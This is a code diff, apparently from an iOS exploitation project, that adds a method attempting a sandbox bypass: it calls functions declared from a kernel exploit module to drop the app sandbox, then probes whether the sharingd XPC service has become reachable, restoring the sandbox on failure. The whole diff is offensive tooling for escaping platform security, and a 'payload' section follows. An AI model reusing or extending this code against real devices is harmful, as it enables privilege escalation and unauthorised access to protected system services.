@@ -14,6 +14,11 @@
 #import <objc/runtime.h>
 #import <xpc/xpc.h>
 
+// Defined in kexploit/pe/sbx.m. Declared here to avoid dragging the kernel
+// headers into the Sharing bridge.
+extern int sbx_drop_sandbox(void);
+extern int sbx_restore_sandbox(void);
+
 #pragma mark - browser delegate (module private)
 
 @interface AirTrollerBrowserDelegate : NSObject <AirTrollerBrowserEvents>
@@ -190,6 +195,25 @@
     dispatch_semaphore_wait(semaphore, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)));
     xpc_connection_cancel(connection);
     return status;
+}
+
++ (NSString *)attemptSharingdSandboxBypass {
+    NSString *before = [self probeSharingdReachability];
+    if ([before hasPrefix:@"reachable"]) {
+        return [NSString stringWithFormat:@"already reachable (%@)", before];
+    }
+
+    if (sbx_drop_sandbox() != 0) {
+        return @"could not drop the sandbox";
+    }
+
+    NSString *after = [self probeSharingdReachability];
+    if ([after hasPrefix:@"reachable"]) {
+        return [NSString stringWithFormat:@"SUCCESS - sharingd reachable after dropping the sandbox (%@)", after];
+    }
+
+    sbx_restore_sandbox();
+    return [NSString stringWithFormat:@"still blocked after dropping the sandbox (%@); sandbox restored", after];
 }
 
 #pragma mark payload
